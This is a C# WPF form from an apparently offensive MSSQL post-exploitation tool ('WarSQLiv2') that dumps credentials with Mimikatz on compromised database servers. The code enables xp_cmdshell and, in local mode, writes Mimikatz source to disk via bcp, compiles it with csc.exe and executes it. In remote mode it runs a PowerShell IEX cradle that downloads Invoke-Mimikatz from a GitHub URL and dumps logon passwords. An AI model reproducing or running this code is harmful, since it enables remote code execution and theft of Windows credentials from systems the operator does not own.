using System;
using System.IO;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Threading;
using WarSQLiv2.Exploitation.Control;
using WarSQLiv2.Exploitation.PostExploitation;

namespace WarSQLiv2.UserControls.Attack.MSSQL
{
    /// <summary>
    /// Interaction logic for FrmMimikatzDump.xaml
    /// </summary>
    public partial class FrmMimikatzDump : Window
    {
        private readonly LanguageControl _languageControl = new LanguageControl();
        public xpCmdShellControl cmdControl = new xpCmdShellControl();
        readonly MsSqlPostExploitation _postExploitation = new MsSqlPostExploitation();
        private int _selectedId = 0;
        public FrmMimikatzDump()
        {
            InitializeComponent();
        }
        private void Window_Loaded(object sender, RoutedEventArgs e)
        {
            _languageControl.FindLang();
            var lootedFileControl = new LootedFileControl();
            try
            {
                Dispatcher.Invoke((Action)delegate
                {
                    btnRun.Content = _languageControl.SelectedLanguage.GetString("ButtonRunCommand");
                    lblDetails.Content = _languageControl.SelectedLanguage.GetString("LabelDetails");
                    lblLooted.Content = _languageControl.SelectedLanguage.GetString("GroupBoxLooted");
                    Title = _languageControl.SelectedLanguage.GetString("TitleMimikatz");
                    rdLocal.IsChecked = true;
                    lootedFileControl.FileControl();
                    var lootedList = lootedFileControl.LootedList;
                    foreach (var t in lootedList)
                    {
                        lstLooted.Items.Add(t);
                    }

                    lstLooted.SelectedIndex = 0;
                    var toolStripControl = new ToolStripInformation
                    {
                        SelectedLootedServer = lstLooted.SelectedItem.ToString(),
                        Command = "sp_server_info",
                    };
                    toolStripControl.SqlServerInformation();
                    lblStrip.Content = string.Empty;
                    lblStrip.Content = toolStripControl.SqlServerInfo;
                });

            }
            catch (Exception exp)
            {
                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                {
                    txtStatus.AppendText(lootedFileControl.Exception);
                });
            }
        }
        private void lstLooted_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            try
            {
                Dispatcher.Invoke((Action)delegate
                {
                    _selectedId = 0;
                    _selectedId = lstLooted.SelectedIndex;
                    lblStrip.Content = string.Empty;
                    var toolStripControl = new ToolStripInformation
                    {
                        SelectedLootedServer = lstLooted.SelectedItem.ToString(),
                        Command = "sp_server_info",
                    };
                    toolStripControl.SqlServerInformation();
                    lblStrip.Content = toolStripControl.SqlServerInfo;
                });

            }
            catch (Exception exp)
            {
                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                {
                    txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                });

            }
        }
        private void btnRun_Click(object sender, RoutedEventArgs e)
        {
            var isActivated = cmdControl.isActivated;
            var isExecuted = cmdControl.isExecuted;
            if (isActivated == false && isExecuted == false)
            {
                var enableXpCmdShell = new EnableXpCmdShell { LootedServer = lstLooted.SelectedItem.ToString() };
                try
                {
                    Dispatcher.Invoke((Action)delegate
                    {
                        enableXpCmdShell.XpCmdShellStatus();
                        txtStatus.AppendText(enableXpCmdShell.Result);
                        var cmdLandResult = _languageControl.SelectedLanguage.GetString("XPCmdShell2");
                        var contains = enableXpCmdShell.Result.Contains(cmdLandResult);
                        if (contains == true)
                        {
                            isActivated = true;
                            isExecuted = true;
                        }
                    });
                }
                catch (Exception)
                {
                    Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                    {
                        txtStatus.AppendText(enableXpCmdShell.CmdException);
                    });
                }
            }
            if (isExecuted == true && isActivated == true)
            {
                if (rdLocal.IsChecked == true)
                {
                    var savedFileNAme = string.Empty;
                    var mimiBinary = File.ReadAllBytes(@"Scanner\Mimikatz\1.txt");
                    try
                    {
                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                        {
                            _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
                            _postExploitation.CreateBinaryTable();
                            txtStatus.AppendText(_postExploitation.ExploitResult);


                            _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
                            _postExploitation.BinaryData = mimiBinary;
                            _postExploitation.InsertBinaryData();
                            txtStatus.AppendText(_postExploitation.ExploitResult);
                        });
                    }
                    catch (Exception exp)
                    {
                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                        {
                            txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                        });
                    }

                    try
                    {
                        _postExploitation.ExploitCode = string.Empty;
                        var rnd = new Random();
                        var chr = "0123456789ABCDEFGHIJKLMNOPRSTUVWXYZ".ToCharArray();
                        var randomFileName = string.Empty;
                        for (int i = 0; i < 12; i++)
                        {
                            randomFileName += chr[rnd.Next(0, chr.Length - 1)].ToString();
                        }
                        var extension = "txt";
                        _postExploitation.ExploitCode += "DECLARE @cmd  VARCHAR(8000);";
                        _postExploitation.ExploitCode += "SET @cmd = 'bcp.exe \"SELECT CAST(binaryTable AS VARCHAR(MAX)) FROM WarSQLiTemp\" queryout \"C:\\Users\\MSSQLSERVER\\" + randomFileName + "." + extension + "\" -c -T';";
                        _postExploitation.ExploitCode += "EXEC xp_cmdshell  @cmd;";

                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                        {
                            _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
                            _postExploitation.RunExploit();
                            txtStatus.AppendText(_postExploitation.ExploitResult);
                            txtStatus.AppendText("File Saved: C:\\Users\\MSSQLSERVER\\" + randomFileName + "." + extension);
                            savedFileNAme = "C:\\Users\\MSSQLSERVER\\" + randomFileName + "." + extension;
                        });
                    }
                    catch (Exception exp)
                    {
                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                        {
                            txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                        });
                    }

                    try
                    {
                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                        {
                            _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
                            _postExploitation.RemoveTempTable();
                            txtStatus.AppendText(_postExploitation.ExploitResult);
                        });
                    }
                    catch (Exception exp)
                    {
                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                        {
                            txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                        });
                    }

                    try
                    {
                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                        {
                            _postExploitation.ExploitCode = string.Empty;
                            _postExploitation.ExploitCode += "EXEC xp_cmdshell 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:C:\\Users\\MSSQLSERVER\\eyup.exe " + savedFileNAme + "';";
                            _postExploitation.RunExploit();
                            txtStatus.AppendText(_postExploitation.ExploitResult);
                        });
                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                        {
                            _postExploitation.ExploitCode = string.Empty;
                            _postExploitation.ExploitCode += "EXEC xp_cmdshell 'cmd.exe /c C:\\Users\\MSSQLSERVER\\eyup.exe';";
                            _postExploitation.RunExploit();
                            txtStatus.AppendText(_postExploitation.ExploitResult);
                        });
                    }
                    catch (Exception exp)
                    {
                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                        {
                            txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                        });
                    }
                }
                else
                {
                    try
                    {
                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                        {
                            _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
                            var sendMimiText = "IEX (New-Object Net.WebClient).DownloadString('" + txtUrl.Text + "'); Invoke-Mimikatz -Command \"privilege::debug sekurlsa::logonPasswords exit\"";
                            var psBs64 = EncodeBase64.ConvertTextToBase64(sendMimiText);
                            _postExploitation.ExploitCode = string.Empty;
                            _postExploitation.ExploitCode += "EXEC xp_cmdshell '" + psBs64 + "';";
                            _postExploitation.RunExploit();
                            txtStatus.AppendText(_postExploitation.ExploitResult);
                        });
                    }
                    catch (Exception exp)
                    {
                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                        {
                            txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                        });
                    }
                }
            }
        }
        private void rdRemote_Click(object sender, RoutedEventArgs e)
        {
            txtUrl.IsEnabled = true;
            txtUrl.Text = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1";
        }
        private void rdLocal_Click(object sender, RoutedEventArgs e)
        {
            txtUrl.Text = string.Empty;
            txtUrl.IsEnabled = false;
        }
    }
}
